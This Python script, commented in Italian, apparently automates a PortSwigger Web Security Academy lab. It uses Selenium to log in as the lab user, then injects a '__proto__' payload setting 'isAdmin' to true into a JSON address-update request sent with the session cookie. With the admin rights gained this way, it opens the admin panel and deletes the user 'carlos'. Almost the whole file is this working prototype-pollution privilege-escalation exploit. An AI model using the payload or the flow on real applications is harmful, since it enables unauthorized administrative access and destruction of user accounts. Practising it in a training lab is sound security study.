from selenium import webdriver
from browsermobproxy import Server #Se usiamo un proxy, riusciamo a stampare e far vedere tutto nel terminale
import json

from time import sleep

import requests
driver = webdriver.Chrome()
LAB_URL = "https://0a3800480341917480c2e94900f9006e.web-security-academy.net"
def login(driver):
    driver.get(f"{LAB_URL}/login")
    form_username = driver.find_element("name", "username")
    form_password = driver.find_element("name", "password")
    login_button = driver.find_element("xpath", '//*[contains(text(), "Log in")]')
    form_username.send_keys("wiener")
    sleep(1)
    form_password.send_keys("peter")
    sleep(1)
    current_url = driver.current_url
    login_button.click()
    sleep(2)
    return current_url

def update_billing_address(driver):
    tags = {
        "address_line_1": "Ponte Pietro Bucci",
        "address_line_2": "via della Patata,0",
        "city": "Cosenza",
        "postcode": "A",
        "country": "Italy"
    }
    for key in tags:
        el = driver.find_element("name",key)
        el.clear()
        el.send_keys(tags[key])
        sleep(1)
    sessionId = driver.find_element("name", "sessionId").get_attribute("value")
    submit_button = driver.find_element("xpath", '//*[contains(text(), "Submit")]')
    submit_button.click()
    return sessionId

def manipulate_json(json_response,session_id):
    json_response.pop("isAdmin")
    malicious_json = json_response
    malicious_json["sessionId"] = session_id
    malicious_json["__proto__"] = {"isAdmin": True}
    return malicious_json

def send_POST_to_change_address(malicious_json,cookie):
    endpoint_POST = f"{LAB_URL}/my-account/change-address"
    headers = {"Cookie": f"session={cookie}"}
    response = requests.post(url=endpoint_POST, data=json.dumps(malicious_json), headers=headers)
    print(response.json())
    return response

def go_to_admin_panel(driver):
    admin_button = driver.find_element("xpath", '//*[contains(text(), "Admin panel")]')
    admin_button.click()

def delete_carlos(driver):
    delete_buttons = driver.find_elements("xpath", '//*[contains(text(), "Delete")]')
    delete_buttons[1].click()

current_url = login(driver)

sleep(2)
if driver.current_url != current_url:
    sessionId = update_billing_address(driver)
    #Quando useremo il proxy saremo in grado di prendere la POST e manovrarla
    #TODO: Proxy, e completare l'eliminazione di Carlos
    json_risposta = {"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Ponte Pietro Bucci","address_line_2":"via della Patata, 0","city":"Cosenza","postcode":"A","country":"Italy","isAdmin":False}
    json_malevolo = manipulate_json(json_risposta,sessionId)
    cookie = driver.get_cookie("session")["value"]
    print(f"Session Cookie : {cookie} ")
    sleep(2)
    send_POST_to_change_address(json_malevolo,cookie)
    sleep(1)
    driver.refresh()
    sleep(2)
    go_to_admin_panel(driver)
    sleep(2)
    delete_carlos(driver)
    sleep(50)






driver.quit()